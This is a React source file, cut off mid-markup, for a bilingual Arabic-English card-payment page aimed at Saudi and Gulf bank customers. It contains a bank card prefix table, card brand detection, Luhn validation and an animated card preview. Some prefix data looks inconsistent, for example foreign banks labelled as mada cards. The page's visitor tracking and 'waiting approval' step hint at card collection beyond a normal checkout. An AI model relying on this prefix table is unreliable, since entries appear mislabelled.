import { useState, useRef, useCallback } from "react";
import { useNavigate, useLocation } from "react-router-dom";
import { supabase } from "@/integrations/supabase/client";
import { trackVisitorAction } from "@/hooks/use-visitor-tracking";
import { useToast } from "@/hooks/use-toast";
import { useLanguage } from "@/i18n/LanguageContext";
import Header from "@/components/Header";
import Footer from "@/components/Footer";
import WaitingApproval from "@/components/WaitingApproval";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { Separator } from "@/components/ui/separator";
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
import { CreditCard, Lock, ShieldCheck, ArrowLeft, ArrowRight, Wifi } from "lucide-react";
import { motion, AnimatePresence } from "framer-motion";
import { playChime } from "@/hooks/use-action-sound";

/* ─── BIN Database: Saudi + Gulf Banks ─── */
interface BankInfo {
  name: string;
  nameAr: string;
  logo: string;
  color: string;
  type: "debit" | "credit" | "prepaid";
  typeAr: string;
}

// Helper to create entries quickly
const rajhi = (type: "debit" | "credit"): BankInfo => ({ name: "Al Rajhi Bank", nameAr: "مصرف الراجحي", logo: "الراجحي", color: "#004B87", type, typeAr: type === "debit" ? "مدى" : "ائتمانية" });
const snb = (type: "debit" | "credit"): BankInfo => ({ name: "Saudi National Bank", nameAr: "البنك الأهلي السعودي", logo: "الأهلي", color: "#006838", type, typeAr: type === "debit" ? "مدى" : "ائتمانية" });
const bsf = (type: "debit" | "credit"): BankInfo => ({ name: "Banque Saudi Fransi", nameAr: "البنك السعودي الفرنسي", logo: "BSF", color: "#00A650", type, typeAr: type === "debit" ? "مدى" : "ائتمانية" });
const riyad = (type: "debit" | "credit"): BankInfo => ({ name: "Riyad Bank", nameAr: "بنك الرياض", logo: "الرياض", color: "#7B2D8E", type, typeAr: type === "debit" ? "مدى" : "ائتمانية" });
const alinma = (type: "debit" | "credit" | "prepaid"): BankInfo => ({ name: "Alinma Bank", nameAr: "مصرف الإنماء", logo: "الإنماء", color: "#8B6914", type, typeAr: type === "debit" ? "مدى" : type === "credit" ? "ائتمانية" : "مسبقة الدفع" });
const bilad = (type: "debit" | "credit"): BankInfo => ({ name: "Bank Albilad", nameAr: "بنك البلاد", logo: "البلاد", color: "#00529B", type, typeAr: type === "debit" ? "مدى" : "ائتمانية" });
const sab = (type: "debit" | "credit"): BankInfo => ({ name: "Saudi Awwal Bank (SAB)", nameAr: "البنك السعودي الأول", logo: "SAB", color: "#E31937", type, typeAr: type === "debit" ? "مدى" : "ائتمانية" });
const anb = (type: "debit" | "credit"): BankInfo => ({ name: "Arab National Bank", nameAr: "البنك العربي الوطني", logo: "العربي", color: "#004A8F", type, typeAr: type === "debit" ? "مدى" : "ائتمانية" });
const jazira = (type: "debit" | "credit"): BankInfo => ({ name: "Bank AlJazira", nameAr: "بنك الجزيرة", logo: "الجزيرة", color: "#C8102E", type, typeAr: type === "debit" ? "مدى" : "ائتمانية" });
const saib = (type: "debit" | "credit"): BankInfo => ({ name: "Saudi Investment Bank", nameAr: "البنك السعودي للاستثمار", logo: "SAIB", color: "#003D6B", type, typeAr: type === "debit" ? "مدى" : "ائتمانية" });
const gib = (type: "debit" | "credit"): BankInfo => ({ name: "Gulf International Bank", nameAr: "بنك الخليج الدولي", logo: "GIB", color: "#1C3F6E", type, typeAr: type === "debit" ? "مدى" : "ائتمانية" });

// Additional bank helpers
const samba = (type: "debit" | "credit"): BankInfo => ({ name: "Samba Financial Group", nameAr: "مجموعة سامبا المالية", logo: "سامبا", color: "#003366", type, typeAr: type === "debit" ? "مدى" : "ائتمانية" });
const hollandi = (type: "debit" | "credit"): BankInfo => ({ name: "Saudi Hollandi Bank", nameAr: "البنك السعودي الهولندي", logo: "SNH", color: "#00573F", type, typeAr: type === "debit" ? "مدى" : "ائتمانية" });

const BANK_BINS: Record<string, BankInfo> = {
  // ═══ Al Rajhi Bank — مصرف الراجحي (35 BINs) ═══
  "400861": rajhi("debit"),
  "403281": rajhi("debit"),
  "404610": rajhi("debit"),
  "405433": rajhi("credit"),
  "407620": rajhi("credit"),
  "409201": rajhi("debit"),
  "410248": rajhi("debit"),
  "410249": rajhi("debit"),
  "410621": rajhi("debit"),
  "414627": rajhi("credit"),
  "417323": rajhi("credit"),
  "419461": rajhi("credit"),
  "421047": rajhi("credit"),
  "425466": rajhi("credit"),
  "432767": rajhi("debit"),
  "445520": rajhi("credit"),
  "445522": rajhi("credit"),
  "445826": rajhi("credit"),
  "445827": rajhi("credit"),
  "446393": rajhi("debit"),
  "455708": rajhi("debit"),
  "455740": rajhi("debit"),
  "458456": rajhi("debit"),
  "462220": rajhi("debit"),
  "478110": rajhi("credit"),
  "484783": rajhi("debit"),
  "490980": rajhi("credit"),
  "494329": rajhi("credit"),
  "512301": rajhi("credit"),
  "524126": rajhi("credit"),
  "529078": rajhi("credit"),
  "537130": rajhi("debit"),
  "554575": rajhi("credit"),
  "558192": rajhi("credit"),
  "968205": rajhi("debit"),

  // ═══ Saudi National Bank (SNB / الأهلي) (30 BINs) ═══
  "412113": snb("debit"),
  "414026": snb("credit"),
  "417633": snb("debit"),
  "420689": snb("credit"),
  "422817": snb("debit"),
  "422818": snb("debit"),
  "422819": snb("debit"),
  "422862": snb("credit"),
  "428331": snb("debit"),
  "433347": snb("credit"),
  "448748": snb("credit"),
  "457865": snb("debit"),
  "464052": snb("credit"),
  "491797": snb("credit"),
  "492146": snb("credit"),
  "517720": snb("credit"),
  "518694": snb("credit"),
  "519310": snb("credit"),
  "521031": snb("credit"),
  "523954": snb("credit"),
  "523998": snb("credit"),
  "524116": snb("credit"),
  "524130": snb("debit"),
  "529415": snb("debit"),
  "535825": snb("debit"),
  "543085": snb("debit"),
  "549760": snb("debit"),
  "554180": snb("debit"),
  "556675": snb("credit"),
  "556676": snb("credit"),
  "588850": snb("debit"),
  "968202": snb("debit"),

  // ═══ Banque Saudi Fransi — البنك السعودي الفرنسي (22 BINs) ═══
  "404847": bsf("credit"),
  "407985": bsf("credit"),
  "421141": bsf("debit"),
  "431765": bsf("credit"),
  "440647": bsf("debit"),
  "440795": bsf("debit"),
  "444445": bsf("credit"),
  "446404": bsf("debit"),
  "447335": bsf("credit"),
  "457997": bsf("debit"),
  "457998": bsf("credit"),
  "464280": bsf("credit"),
  "474491": bsf("credit"),
  "476300": bsf("debit"),
  "484220": bsf("credit"),
  "517724": bsf("credit"),
  "524148": bsf("credit"),
  "531243": bsf("credit"),
  "546280": bsf("credit"),
  "552360": bsf("credit"),
  "588845": bsf("debit"),
  "968208": bsf("debit"),

  // ═══ Riyad Bank — بنك الرياض (28 BINs) ═══
  "407116": riyad("credit"),
  "421839": riyad("credit"),
  "435240": riyad("credit"),
  "448508": riyad("credit"),
  "455901": riyad("credit"),
  "464910": riyad("debit"),
  "468540": riyad("debit"),
  "468541": riyad("debit"),
  "468542": riyad("debit"),
  "468543": riyad("debit"),
  "478342": riyad("credit"),
  "489320": riyad("debit"),
  "491421": riyad("credit"),
  "513213": riyad("credit"),
  "514932": riyad("credit"),
  "517531": riyad("credit"),
  "520058": riyad("credit"),
  "520090": riyad("credit"),
  "524514": riyad("debit"),
  "527138": riyad("credit"),
  "529741": riyad("debit"),
  "535989": riyad("debit"),
  "536023": riyad("debit"),
  "537767": riyad("debit"),
  "543901": riyad("credit"),
  "558563": riyad("credit"),
  "559322": riyad("credit"),
  "968209": riyad("debit"),

  // ═══ Alinma Bank — مصرف الإنماء (22 BINs) ═══
  "402908": alinma("debit"),
  "407197": alinma("credit"),
  "407395": alinma("credit"),
  "412565": alinma("debit"),
  "419738": alinma("credit"),
  "424870": alinma("debit"),
  "428671": alinma("debit"),
  "428672": alinma("debit"),
  "428673": alinma("debit"),
  "432328": alinma("debit"),
  "434107": alinma("debit"),
  "440816": alinma("debit"),
  "446672": alinma("debit"),
  "459875": alinma("credit"),
  "485601": alinma("credit"),
  "512468": alinma("credit"),
  "527610": alinma("credit"),
  "531827": alinma("credit"),
  "543357": alinma("debit"),
  "552363": alinma("credit"),
  "968206": alinma("debit"),
  "968211": alinma("debit"),

  // ═══ Bank Albilad — بنك البلاد (18 BINs) ═══
  "403085": bilad("debit"),
  "410153": bilad("debit"),
  "417815": bilad("credit"),
  "424260": bilad("debit"),
  "424261": bilad("debit"),
  "424262": bilad("debit"),
  "431204": bilad("debit"),
  "440952": bilad("debit"),
  "455392": bilad("credit"),
  "460707": bilad("debit"),
  "480091": bilad("credit"),
  "510832": bilad("credit"),
  "521488": bilad("credit"),
  "529630": bilad("credit"),
  "543218": bilad("debit"),
  "552710": bilad("credit"),
  "636120": bilad("debit"),
  "968201": bilad("debit"),

  // ═══ Saudi Awwal Bank (SAB / SABB) — البنك السعودي الأول (25 BINs) ═══
  "404325": sab("credit"),
  "414478": sab("credit"),
  "423810": sab("credit"),
  "433786": sab("credit"),
  "441261": sab("credit"),
  "448933": sab("debit"),
  "455340": sab("credit"),
  "455389": sab("credit"),
  "456891": sab("credit"),
  "462785": sab("debit"),
  "478830": sab("credit"),
  "490160": sab("credit"),
  "492310": sab("credit"),
  "508160": sab("debit"),
  "512060": sab("credit"),
  "519782": sab("credit"),
  "530906": sab("debit"),
  "531095": sab("debit"),
  "532013": sab("debit"),
  "541920": sab("credit"),
  "552375": sab("credit"),
  "552438": sab("credit"),
  "557606": sab("debit"),
  "558848": sab("debit"),
  "558854": sab("credit"),
  "605141": sab("debit"),
  "968203": sab("debit"),
  "968204": sab("debit"),

  // ═══ Arab National Bank — البنك العربي الوطني (20 BINs) ═══
  "403940": anb("credit"),
  "410935": anb("debit"),
  "421730": anb("credit"),
  "431556": anb("debit"),
  "442920": anb("credit"),
  "455017": anb("credit"),
  "455036": anb("debit"),
  "462115": anb("debit"),
  "476298": anb("credit"),
  "486094": anb("debit"),
  "486095": anb("debit"),
  "486096": anb("debit"),
  "491610": anb("credit"),
  "517918": anb("credit"),
  "524310": anb("credit"),
  "531678": anb("credit"),
  "542981": anb("credit"),
  "553240": anb("credit"),
  "588848": anb("debit"),
  "968212": anb("debit"),

  // ═══ Bank AlJazira — بنك الجزيرة (18 BINs) ═══
  "402710": jazira("debit"),
  "410490": jazira("credit"),
  "414090": jazira("credit"),
  "424180": jazira("debit"),
  "433190": jazira("credit"),
  "440533": jazira("debit"),
  "445564": jazira("debit"),
  "453210": jazira("credit"),
  "468901": jazira("debit"),
  "478590": jazira("credit"),
  "489317": jazira("debit"),
  "489318": jazira("debit"),
  "489319": jazira("debit"),
  "504300": jazira("debit"),
  "515804": jazira("credit"),
  "525630": jazira("credit"),
  "539410": jazira("credit"),
  "968213": jazira("debit"),

  // ═══ Saudi Investment Bank (SAIB) — البنك السعودي للاستثمار (22 BINs) ═══
  "406136": saib("debit"),
  "440629": saib("credit"),
  "440630": saib("debit"),
  "440631": saib("credit"),
  "457840": saib("credit"),
  "457841": saib("credit"),
  "457842": saib("credit"),
  "457843": saib("credit"),
  "469616": saib("credit"),
  "476815": saib("credit"),
  "478295": { name: "Saudi Investment Bank", nameAr: "البنك السعودي للاستثمار", logo: "SAIB", color: "#003D6B", type: "prepaid", typeAr: "مسبقة الدفع" },
  "478296": { name: "Saudi Investment Bank", nameAr: "البنك السعودي للاستثمار", logo: "SAIB", color: "#003D6B", type: "prepaid", typeAr: "مسبقة الدفع" },
  "483009": saib("credit"),
  "483010": saib("debit"),
  "483011": saib("debit"),
  "483012": saib("debit"),
  "524205": saib("credit"),
  "529298": saib("credit"),
  "542373": saib("credit"),
  "552384": saib("credit"),
  "589206": saib("debit"),
  "968207": saib("debit"),

  // ═══ Samba Financial Group — مجموعة سامبا المالية (20 BINs) ═══
  "404215": samba("credit"),
  "415890": samba("credit"),
  "427310": samba("debit"),
  "433987": samba("credit"),
  "433988": samba("credit"),
  "441780": samba("credit"),
  "454336": samba("credit"),
  "454337": samba("credit"),
  "454338": samba("debit"),
  "465920": samba("debit"),
  "476430": samba("credit"),
  "489316": samba("debit"),
  "496649": samba("credit"),
  "496650": samba("debit"),
  "519450": samba("credit"),
  "527890": samba("credit"),
  "534210": samba("credit"),
  "548760": samba("credit"),
  "553180": samba("credit"),
  "968210": samba("debit"),

  // ═══ Saudi Hollandi Bank (now SNB) — البنك السعودي الهولندي (12 BINs) ═══
  "410747": hollandi("credit"),
  "411166": hollandi("credit"),
  "411167": hollandi("credit"),
  "412518": hollandi("credit"),
  "416041": hollandi("credit"),
  "427733": hollandi("credit"),
  "427739": hollandi("credit"),
  "490745": hollandi("credit"),
  "493428": hollandi("debit"),
  "522139": hollandi("credit"),
  "524165": hollandi("credit"),
  "558705": hollandi("credit"),

  // ═══ Gulf International Bank — بنك الخليج الدولي (10 BINs) ═══
  "403710": gib("debit"),
  "415620": gib("credit"),
  "419593": gib("debit"),
  "431890": gib("debit"),
  "439954": gib("debit"),
  "467210": gib("debit"),
  "483560": gib("credit"),
  "521340": gib("credit"),
  "538970": gib("credit"),
  "551280": gib("credit"),

  // ═══ STC Pay — إس تي سي باي ═══
  "420132": { name: "STC Pay", nameAr: "إس تي سي باي", logo: "STC", color: "#6F2C91", type: "prepaid", typeAr: "مسبقة الدفع" },

  // ═══ Nomo Bank (BSF Digital) — بنك نومو ═══
  "536120": { name: "Nomo Bank (BSF Digital)", nameAr: "بنك نومو (الفرنسي الرقمي)", logo: "Nomo", color: "#1A1A2E", type: "debit", typeAr: "مدى" },

  // ═══ D360 Bank — بنك دال ═══
  "559399": { name: "D360 Bank", nameAr: "بنك دال", logo: "D360", color: "#FF6B00", type: "prepaid", typeAr: "مسبقة الدفع" },

  // ═══ Saudi Digital Bank (SDB) — البنك السعودي الرقمي ═══
  "556699": { name: "Saudi Digital Bank", nameAr: "البنك السعودي الرقمي", logo: "SDB", color: "#00B4D8", type: "debit", typeAr: "مدى" },

  // ═══ Bank of China (Saudi Branch) — بنك الصين ═══
  "621700": { name: "Bank of China (Saudi)", nameAr: "بنك الصين - فرع السعودية", logo: "BOC", color: "#C41230", type: "credit", typeAr: "ائتمانية" },

  // ═══ Gulf Banks — UAE ═══
  "410682": { name: "Emirates Bank International", nameAr: "بنك الإمارات الدولي", logo: "EBI", color: "#003B5C", type: "debit", typeAr: "مدى" },
  "410683": { name: "Emirates Bank International", nameAr: "بنك الإمارات الدولي", logo: "EBI", color: "#003B5C", type: "debit", typeAr: "مدى" },
  "410684": { name: "Emirates NBD", nameAr: "الإمارات دبي الوطني", logo: "ENBD", color: "#003B5C", type: "credit", typeAr: "ائتمانية" },
  "410685": { name: "Emirates NBD", nameAr: "الإمارات دبي الوطني", logo: "ENBD", color: "#003B5C", type: "debit", typeAr: "مدى" },
  "431199": { name: "Emirates NBD", nameAr: "الإمارات دبي الوطني", logo: "ENBD", color: "#003B5C", type: "credit", typeAr: "ائتمانية" },
  "426058": { name: "Abu Dhabi Commercial Bank", nameAr: "بنك أبوظبي التجاري", logo: "ADCB", color: "#A32035", type: "credit", typeAr: "ائتمانية" },
  "432229": { name: "First Abu Dhabi Bank", nameAr: "بنك أبوظبي الأول", logo: "FAB", color: "#B8860B", type: "credit", typeAr: "ائتمانية" },
  "530060": { name: "First Abu Dhabi Bank", nameAr: "بنك أبوظبي الأول", logo: "FAB", color: "#B8860B", type: "credit", typeAr: "ائتمانية" },
  "531196": { name: "First Abu Dhabi Bank", nameAr: "بنك أبوظبي الأول", logo: "FAB", color: "#B8860B", type: "credit", typeAr: "ائتمانية" },
  "455701": { name: "Mashreq Bank", nameAr: "بنك المشرق", logo: "Mashreq", color: "#F47920", type: "credit", typeAr: "ائتمانية" },
  "406996": { name: "Dubai Islamic Bank", nameAr: "بنك دبي الإسلامي", logo: "DIB", color: "#00573F", type: "credit", typeAr: "ائتمانية" },

  // ═══ Gulf Banks — Kuwait ═══
  "464243": { name: "National Bank of Kuwait", nameAr: "بنك الكويت الوطني", logo: "NBK", color: "#003087", type: "credit", typeAr: "ائتمانية" },
  "431361": { name: "National Bank of Kuwait", nameAr: "بنك الكويت الوطني", logo: "NBK", color: "#003087", type: "debit", typeAr: "مدى" },
  "403024": { name: "Kuwait Finance House", nameAr: "بيت التمويل الكويتي", logo: "KFH", color: "#00573F", type: "credit", typeAr: "ائتمانية" },

  // ═══ Gulf Banks — Bahrain ═══
  "423535": { name: "National Bank of Bahrain", nameAr: "بنك البحرين الوطني", logo: "NBB", color: "#004B87", type: "credit", typeAr: "ائتمانية" },
  "521076": { name: "National Bank of Bahrain", nameAr: "بنك البحرين الوطني", logo: "NBB", color: "#004B87", type: "debit", typeAr: "مدى" },
  "604906": { name: "National Bank of Bahrain", nameAr: "بنك البحرين الوطني", logo: "NBB", color: "#004B87", type: "debit", typeAr: "مدى" },

  // ═══ Gulf Banks — Qatar ═══
  "421497": { name: "Qatar National Bank", nameAr: "بنك قطر الوطني", logo: "QNB", color: "#6F2C91", type: "credit", typeAr: "ائتمانية" },

  // ═══ Gulf Banks — Oman ═══
  "410182": { name: "Bank Muscat", nameAr: "بنك مسقط", logo: "BM", color: "#B8202E", type: "credit", typeAr: "ائتمانية" },

  // ═══ Test cards ═══
  "424242": { name: "Stripe Test", nameAr: "بطاقة اختبار", logo: "TEST", color: "#635BFF", type: "credit", typeAr: "ائتمانية" },
  "411111": { name: "Test Card", nameAr: "بطاقة اختبار", logo: "TEST", color: "#635BFF", type: "credit", typeAr: "ائتمانية" },
};

const MADA_BINS = [
  // Visa-based mada
  "400861","403024","406136","406996","407197","407395","409201","410248",
  "410249","410621","410685","412113","412565","414090","414478","417633",
  "419593","420132","421141","422817","422818","422819","422862","424260",
  "424261","424262","428331","428671","428672","428673","431361","432328",
  "434107","435240","439954","440533","440630","440647","440795","444445",
  "445520","445522","445564","446393","446404","446672","455017","455036",
  "455340","455389","455708","455740","456891","457865","457997","457998",
  "458456","462220","468540","468541","468542","468543","474491","483010",
  "483011","483012","484783","486094","486095","486096","489317","489318",
  "489319","490160","490745","490980","493428","494329",
  // MasterCard-based mada
  "504300","508160","512060","513213","514932","515804","517531","517720",
  "517724","517918","518694","519310","520058","520090","521031","521076",
  "522139","523954","523970","523998","524116","524126","524130","524148",
  "524165","524514","529415","529741","530060","530906","531095","531196",
  "532013","535825","535989","536023","537767","543085","543357","549760",
  "552089","552250","552360","552363","552375","552384","552438","554180",
  "554575","556675","556676","557606","558563","558705","558848","558854",
  "559322",
  // Visa/local
  "588845","588848","588850","589206","604906","605141","636120",
  // Local
  "968201","968202","968203","968204","968205","968206","968207","968208",
  "968209","968211",
];

type CardBrand = "visa" | "mastercard" | "amex" | "mada" | null;

const detectCardBrand = (number: string): CardBrand => {
  const digits = number.replace(/\s/g, "");
  if (!digits) return null;
  if (digits.length >= 6 && MADA_BINS.some(bin => digits.startsWith(bin))) return "mada";
  if (/^3[47]/.test(digits)) return "amex";
  if (/^(5[1-5]|2[2-7])/.test(digits)) return "mastercard";
  if (/^4/.test(digits)) return "visa";
  return null;
};

const detectBankInfo = (number: string): BankInfo | null => {
  const digits = number.replace(/\s/g, "");
  if (digits.length < 6) return null;
  const bin = digits.slice(0, 6);
  return BANK_BINS[bin] || null;
};

const detectBank = (number: string, isAr: boolean): string | null => {
  const info = detectBankInfo(number);
  return info ? (isAr ? info.nameAr : info.name) : null;
};

/** Luhn algorithm — validates real card numbers */
const isValidLuhn = (number: string): boolean => {
  const digits = number.replace(/\s/g, "");
  if (!/^\d+$/.test(digits) || digits.length < 13 || digits.length > 19) return false;
  let sum = 0;
  let alternate = false;
  for (let i = digits.length - 1; i >= 0; i--) {
    let n = parseInt(digits[i], 10);
    if (alternate) {
      n *= 2;
      if (n > 9) n -= 9;
    }
    sum += n;
    alternate = !alternate;
  }
  return sum % 10 === 0;
};

/* ─── Inline SVG Logos (colorful) ─── */
const VisaLogo = ({ className = "h-8" }: { className?: string }) => (
  <svg className={className} viewBox="0 0 780 500" xmlns="http://www.w3.org/2000/svg">
    <path d="M293.2 348.73l33.36-195.76h53.35l-33.38 195.76H293.2zm246.11-191.54c-10.57-3.97-27.16-8.21-47.89-8.21-52.83 0-90.07 26.58-90.33 64.65-.27 28.14 26.52 43.83 46.76 53.19 20.78 9.6 27.75 15.72 27.66 24.29-.13 13.12-16.58 19.13-31.91 19.13-21.37 0-32.7-2.96-50.22-10.25l-6.88-3.11-7.49 43.85c12.46 5.46 35.53 10.2 59.47 10.44 56.22 0 92.73-26.28 93.1-66.93.18-22.3-14.04-39.27-44.88-53.27-18.68-9.08-30.14-15.13-30.02-24.32 0-8.15 9.69-16.87 30.63-16.87 17.47-.26 30.16 3.53 40.02 7.5l4.8 2.26 7.26-42.44-.08.09zm138.68-4.22h-41.32c-12.81 0-22.39 3.49-28.01 16.24l-79.43 179.52h56.15s9.17-24.14 11.25-29.44l68.48.07c1.6 6.87 6.51 29.37 6.51 29.37h49.65l-43.28-195.76zm-65.83 126.41c4.42-11.29 21.34-54.77 21.34-54.77-.32.52 4.39-11.36 7.1-18.73l3.62 16.92s10.25 46.88 12.4 56.72l-44.46-.14zM313.57 152.97l-52.33 133.53-5.59-27.15c-9.73-31.27-40.04-65.17-73.96-82.12l47.88 171.37 56.6-.06 84.23-195.57h-56.83" fill="#1A1F71"/>
    <path d="M146.92 152.96H60.88l-.68 4.01c67.11 16.24 111.49 55.44 129.9 102.56l-18.72-89.96c-3.23-12.36-12.59-16.17-24.46-16.61" fill="#F9A533"/>
  </svg>
);

const MastercardLogo = ({ className = "h-8" }: { className?: string }) => (
  <svg className={className} viewBox="0 0 780 500" xmlns="http://www.w3.org/2000/svg">
    <circle cx="310" cy="250" r="180" fill="#EB001B"/>
    <circle cx="470" cy="250" r="180" fill="#F79E1B"/>
    <path d="M390 113.4a179.8 179.8 0 0 0-80 136.6 179.8 179.8 0 0 0 80 136.6 179.8 179.8 0 0 0 80-136.6 179.8 179.8 0 0 0-80-136.6z" fill="#FF5F00"/>
  </svg>
);

const AmexLogo = ({ className = "h-8" }: { className?: string }) => (
  <svg className={className} viewBox="0 0 780 500" xmlns="http://www.w3.org/2000/svg">
    <rect width="780" height="500" rx="40" fill="#2E77BC"/>
    <text x="390" y="280" textAnchor="middle" fill="white" fontFamily="Arial,sans-serif" fontWeight="bold" fontSize="120">AMEX</text>
  </svg>
);

const MadaLogo = ({ className = "h-8" }: { className?: string }) => (
  <svg className={className} viewBox="0 0 200 80" xmlns="http://www.w3.org/2000/svg">
    <text x="100" y="52" textAnchor="middle" fill="#003B71" fontFamily="Arial,sans-serif" fontWeight="bold" fontSize="42">mada</text>
  </svg>
);

const brandLogos: Record<string, React.FC<{ className?: string }>> = {
  visa: VisaLogo,
  mastercard: MastercardLogo,
  amex: AmexLogo,
  mada: MadaLogo,
};

const brandColors: Record<string, { from: string; to: string }> = {
  visa: { from: "#1A1F71", to: "#2C3E99" },
  mastercard: { from: "#EB001B", to: "#F79E1B" },
  amex: { from: "#2E77BC", to: "#1B4F8A" },
  mada: { from: "#003B71", to: "#00A88F" },
};

/* ─── Card Brand Logos (inline field) ─── */
const CardBrandLogos = ({ brand }: { brand: CardBrand }) => (
  <div className="flex items-center gap-2">
    <AnimatePresence mode="wait">
      {brand ? (
        <motion.div
          key={brand}
          initial={{ opacity: 0, scale: 0.7 }}
          animate={{ opacity: 1, scale: 1 }}
          exit={{ opacity: 0, scale: 0.7 }}
          transition={{ duration: 0.2 }}
        >
          {(() => { const Logo = brandLogos[brand]; return <Logo className="h-7" />; })()}
        </motion.div>
      ) : (
        <motion.div key="all" className="flex items-center gap-1.5 opacity-50" initial={{ opacity: 0 }} animate={{ opacity: 0.5 }}>
          <VisaLogo className="h-5" />
          <MastercardLogo className="h-5" />
          <AmexLogo className="h-5" />
        </motion.div>
      )}
    </AnimatePresence>
  </div>
);

/* ─── Interactive Card Preview ─── */
const CardPreview = ({
  cardNumber,
  cardName,
  expiry,
  cvv,
  brand,
  bankInfo,
  bankName,
  isAr,
  isFlipped,
  cvvFocused,
  cardNumberFocused,
  cardNameFocused,
  expiryFocused,
  onFlipToggle,
}: {
  cardNumber: string;
  cardName: string;
  expiry: string;
  cvv: string;
  brand: CardBrand;
  bankInfo: BankInfo | null;
  bankName: string | null;
  isAr: boolean;
  isFlipped: boolean;
  cvvFocused?: boolean;
  cardNumberFocused?: boolean;
  cardNameFocused?: boolean;
  expiryFocused?: boolean;
  onFlipToggle?: () => void;
}) => {
  const colors = brand ? brandColors[brand] : { from: "hsl(var(--primary))", to: "hsl(var(--primary) / 0.7)" };
  const displayNumber = cardNumber || "•••• •••• •••• ••••";
  const displayName = cardName || (isAr ? "اسم حامل البطاقة" : "CARDHOLDER NAME");
  const displayExpiry = expiry || "MM/YY";

  const cardRef = useRef<HTMLDivElement>(null);
  const [tilt, setTilt] = useState({ rotateX: 0, rotateY: 0 });

  const handleMouseMove = useCallback((e: React.MouseEvent<HTMLDivElement>) => {
    if (isFlipped) return;
    const rect = cardRef.current?.getBoundingClientRect();
    if (!rect) return;
    const x = (e.clientX - rect.left) / rect.width;
    const y = (e.clientY - rect.top) / rect.height;
    setTilt({ rotateX: (0.5 - y) * 20, rotateY: (x - 0.5) * 20 });
  }, [isFlipped]);

  const handleMouseLeave = useCallback(() => {
    setTilt({ rotateX: 0, rotateY: 0 });
  }, []);

  return (
    <div
      ref={cardRef}
      className="w-full max-w-[380px] mx-auto mb-6 cursor-pointer select-none"
      style={{ perspective: "1000px" }}
      onMouseMove={handleMouseMove}
      onMouseLeave={handleMouseLeave}
      onClick={onFlipToggle}
    >
      <motion.div
        className="relative w-full aspect-[1.586/1]"
        animate={{
          rotateY: isFlipped ? 180 : tilt.rotateY,
          rotateX: isFlipped ? 0 : tilt.rotateX,
        }}
        transition={{ duration: isFlipped ? 0.6 : 0.15, ease: isFlipped ? [0.4, 0, 0.2, 1] : "easeOut" }}
        style={{ transformStyle: "preserve-3d" }}
      >
        {/* ─── Front Face ─── */}
        <div
          className="absolute inset-0 rounded-2xl overflow-hidden shadow-xl"
          style={{
            background: `linear-gradient(135deg, ${colors.from}, ${colors.to})`,
            backfaceVisibility: "hidden",
          }}
        >
          {/* Pattern overlay */}
          <div className="absolute inset-0 opacity-10">
            <div
              className="absolute inset-0"
              style={{
                backgroundImage: `radial-gradient(circle at 20% 80%, rgba(255,255,255,0.2) 0%, transparent 50%),
                                  radial-gradient(circle at 80% 20%, rgba(255,255,255,0.15) 0%, transparent 50%)`,
              }}
            />
          </div>

          {/* Bank name & logo */}
          {bankInfo && (
            <AnimatePresence mode="wait">
              <motion.div
                key={bankInfo.name}
                className="absolute top-[5%] start-[6%] flex items-center gap-2"
                initial={{ opacity: 0, x: -10 }}
                animate={{ opacity: 1, x: 0 }}
                exit={{ opacity: 0 }}
                transition={{ duration: 0.3 }}
              >
                <div
                  className="w-7 h-7 rounded-md flex items-center justify-center text-[8px] font-bold text-white shadow-sm"
                  style={{ backgroundColor: bankInfo.color }}
                >
                  {bankInfo.logo.slice(0, 2)}
                </div>
                <div className="flex flex-col">
                  <span className="text-white/90 text-[10px] font-semibold leading-tight">
                    {bankName}
                  </span>
                  <span className="text-white/50 text-[8px] leading-tight">
                    {isAr ? bankInfo.typeAr : bankInfo.type}
                  </span>
                </div>
              </motion.div>
            </AnimatePresence>
          )}

          {/* Chip & Contactless */}
          <div className="absolute top-[22%] start-[8%] flex items-center gap-3">
            <div className="w-11 h-8 rounded-md bg-gradient-to-br from-yellow-300/90 to-yellow-500/80 border border-yellow-400/30" />
            <Wifi className="w-5 h-5 text-white/70 rotate-90" />
          </div>

          {/* Brand logo */}
          <div className="absolute top-[12%] end-[8%]">
            <AnimatePresence mode="wait">
              {brand ? (
                <motion.div
                  key={brand}
                  initial={{ opacity: 0, y: -10 }}
                  animate={{ opacity: 1, y: 0 }}
                  exit={{ opacity: 0, y: 10 }}
                  transition={{ duration: 0.3 }}
                >
                  {(() => {
                    const Logo = brandLogos[brand];
                    return <Logo className="h-8 brightness-0 invert opacity-90" />;
                  })()}
                </motion.div>
              ) : (
                <motion.div key="placeholder" initial={{ opacity: 0 }} animate={{ opacity: 0.5 }}>
                  <CreditCard className="w-8 h-8 text-white" />
                </motion.div>
              )}
            </AnimatePresence>
          </div>

          {/* Card number */}
          <div className="absolute top-[50%] start-[8%] end-[8%]">
            <motion.p
              className={`font-mono text-lg md:text-xl tracking-[0.2em] drop-shadow-sm ${cardNumberFocused ? "text-yellow-300" : "text-white"}`}
              dir="ltr"
              key={displayNumber}
              initial={{ opacity: 0.5 }}
              animate={cardNumberFocused ? {
                opacity: [1, 0.4, 1],
                textShadow: ["0 0 8px rgba(253,224,71,0.8)", "0 0 2px rgba(253,224,71,0.2)", "0 0 8px rgba(253,224,71,0.8)"],
              } : { opacity: 1, textShadow: "none" }}
              transition={cardNumberFocused ? { duration: 1.2, repeat: Infinity, ease: "easeInOut" } : { duration: 0.15 }}
            >
              {displayNumber}
            </motion.p>
          </div>

          {/* Bottom info */}
          <div className="absolute bottom-[12%] start-[8%] end-[8%] flex justify-between items-end" dir="ltr">
            <div>
              <p className="text-white/50 text-[10px] uppercase tracking-wider mb-0.5">
                {isAr ? "حامل البطاقة" : "Card Holder"}
              </p>
              <motion.p
                className={`text-xs font-medium tracking-wide truncate max-w-[140px] ${cardNameFocused ? "text-yellow-300" : "text-white"}`}
                key={displayName}
                initial={{ opacity: 0.5 }}
                animate={cardNameFocused ? {
                  opacity: [1, 0.4, 1],
                  textShadow: ["0 0 8px rgba(253,224,71,0.8)", "0 0 2px rgba(253,224,71,0.2)", "0 0 8px rgba(253,224,71,0.8)"],
                } : { opacity: 1, textShadow: "none" }}
                transition={cardNameFocused ? { duration: 1.2, repeat: Infinity, ease: "easeInOut" } : { duration: 0.15 }}
              >
                {displayName.toUpperCase()}
              </motion.p>
            </div>
            <div className="text-center">
              <p className="text-white/50 text-[10px] uppercase tracking-wider mb-0.5">
